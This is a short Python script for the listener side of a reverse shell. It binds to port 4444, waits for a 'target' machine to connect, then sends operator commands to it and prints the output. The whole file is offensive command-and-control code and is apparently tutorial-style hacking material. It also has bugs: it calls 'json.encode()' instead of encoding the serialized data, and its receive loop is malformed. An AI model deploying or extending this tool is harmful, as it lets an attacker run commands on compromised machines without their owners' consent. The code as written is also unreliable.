import socket
import json

target_ip = "192.168.0.8"
target_port = 4444

def target_communic(): 
    while True:
        # initiate a command
        command = input('* Shell~%s: ' % str(ip))
        # send command
        reliable_send(command)
        # quit program
        if command == 'quit': 
            break
        else:
            # receives the response from the target when running our command
            result = reliable_receiv()
            print(result)

def reliable_send(data):
    # data is our command and parses it to json
    jsonData = json.dumps(data)
    # send actual data, once sending data over sockets we need to encode it
    target.send(json.encode())

def reliable_receiv():
    data = ''
    while True:
        try:
            # byte we want to receive (1024) from our target
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


# to make a connection with IP (AF_INET) over TCP (SOCK_STREAM)
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# bind ip address and port
sock.bind((target_ip, target_port))

# start listeing for incoming connections
print('[+++++] Listening for the incoming connections [+++++]')

#listen up to 5 different connections
sock.listen(5)

# we need to store the connection
# accept the incoming connection and storing the target and ip
target, ip = sock.accept()

# Once connection is established
print('[+++++] Target connected from: ' + str(ip))

# communication with target
target_communic()